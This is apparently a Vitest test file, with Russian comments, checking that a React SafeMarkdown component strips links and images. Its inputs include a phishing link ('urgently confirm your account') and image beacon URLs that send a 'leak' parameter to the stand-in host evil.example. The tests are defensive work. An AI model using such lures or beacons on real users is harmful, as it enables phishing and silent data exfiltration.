import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import SafeMarkdown from "@/components/lists/SafeMarkdown";

describe("SafeMarkdown", () => {
  it("оставляет текст ссылки, но не создаёт кликабельный URL", () => {
    const html = renderToStaticMarkup(
      createElement(
        SafeMarkdown,
        null,
        "[Срочно подтвердите аккаунт](https://evil.example/phish)",
      ),
    );

    expect(html).toContain("Срочно подтвердите аккаунт");
    expect(html).not.toContain("<a");
    expect(html).not.toContain("href=");
    expect(html).not.toContain("evil.example");
  });

  it("не переносит подсказку ссылки в разметку", () => {
    const html = renderToStaticMarkup(
      createElement(
        SafeMarkdown,
        null,
        '[Отчёт](https://evil.example/phish "Перейдите на evil.example")',
      ),
    );

    expect(html).toContain("Отчёт");
    expect(html).not.toContain("title=");
    expect(html).not.toContain("Перейдите");
  });

  it("оставляет alt картинки, но не выполняет запрос по её адресу", () => {
    const html = renderToStaticMarkup(
      createElement(
        SafeMarkdown,
        null,
        "![Отчёт по списку](https://evil.example/beacon?d=leak)",
      ),
    );

    expect(html).toContain("Отчёт по списку");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("src=");
    // React добавляет к картинке ещё и `<link rel="preload">`: он тоже уходит
    // на адрес атакующего, поэтому проверяем отсутствие обоих тегов.
    expect(html).not.toContain("preload");
    expect(html).not.toContain("evil.example");
  });

  it("не возвращает адрес картинки, заданной ссылочным определением", () => {
    const html = renderToStaticMarkup(
      createElement(
        SafeMarkdown,
        null,
        "![Отчёт][ref]\n\n[ref]: https://evil.example/beacon?d=leak",
      ),
    );

    expect(html).toContain("Отчёт");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
  });
});
